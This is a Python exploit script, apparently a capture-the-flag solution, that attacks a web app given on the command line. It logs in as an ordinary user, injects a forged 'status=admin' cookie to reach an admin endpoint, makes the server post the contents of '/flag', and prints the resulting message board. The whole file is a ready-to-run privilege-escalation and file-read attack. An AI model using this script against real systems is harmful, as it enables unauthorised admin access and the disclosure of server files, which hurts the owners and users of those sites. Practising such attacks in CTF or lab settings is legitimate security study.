import sys
import requests

# Target web app URL
TARGET = sys.argv[1]

headers = {
    "User-Agent": "MotorolaStarTAC/1.0"
}

# Step 1: Establish a normal session by logging in as `bob`
print("[+] Logging in as a normal user (bob)...")
login_data = {
    "username": "bob",
    "password": "password123"
}

session = requests.Session()
session.post(f"{TARGET}/register", data=login_data)  # Register `bob` if needed
login_response = session.post(f"{TARGET}/login", data=login_data)

if login_response.status_code != 200:
    print("[-] Failed to login as bob.")
    exit(1)

print("[+] Logged in as bob. Normal session established.")
print(f"[*] Normal session cookie: {session.cookies.get_dict()}")

# Step 2: Evil action - Send admin post request, overriding `username` cookie only
evil_cookies = session.cookies.get_dict()  # Start with normal cookies
evil_cookies['status'] = 'admin'  # Inject evil `status`
#session.cookies.set('username', 'admin', domain='localhost')  # Inject evil `username`

data = {
    "filename": "/flag"
}

headers = {
    "User-Agent": "MotorolaStarTAC/1.0"
}

print("[+] Sending forged request to post the flag using forged admin cookie...")

post_response = session.post(f"{TARGET}/admin_post", 
            cookies=evil_cookies, data=data, headers=headers)

if post_response.status_code != 200:
    print(f"[-] Failed to post flag! Status code: {post_response.status_code}")
    exit(1)

print("[+] Flag posted successfully.")

# Step 3: Fetch message board as admin (using the same forged `username` cookie)
print("[+] Fetching message board as admin...")
board_response = session.get(f"{TARGET}/", cookies=evil_cookies, headers=headers)

if board_response.status_code != 200:
    print(f"[-] Failed to fetch message board! Status code: {board_response.status_code}")
    exit(1)

print(board_response.text)
